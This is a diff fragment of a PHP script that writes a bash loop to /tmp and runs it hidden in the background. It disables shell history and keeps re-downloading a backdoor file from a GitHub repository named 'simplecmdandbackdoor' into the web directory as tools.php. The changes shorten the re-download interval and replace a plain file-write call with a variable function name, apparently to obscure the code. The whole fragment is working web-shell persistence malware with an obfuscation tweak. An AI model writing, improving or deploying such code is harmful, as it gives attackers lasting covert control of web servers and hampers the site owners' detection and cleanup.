@@ -24,12 +24,12 @@ unset HISTFILE
 while true; do
   # Suppress wget output and avoid logging
   wget -q --no-check-certificate https://github.com/Yucaerin/simplecmdandbackdoor/raw/main/resize.php -O $currentDir/tools.php
-  sleep 10
+  sleep 5
 done
 EOD;
 $scriptContent = str_replace("\r", "", $scriptContent);
 $scriptFile = '/tmp/phpdmJvU8';
-file_put_contents($scriptFile, $scriptContent);
+$FPC($scriptFile, $scriptContent);
 chmod($scriptFile, 0755);
 exec("nohup /bin/bash $scriptFile > /tmp/phpdmJvU9 2>&1 &");
 ?>
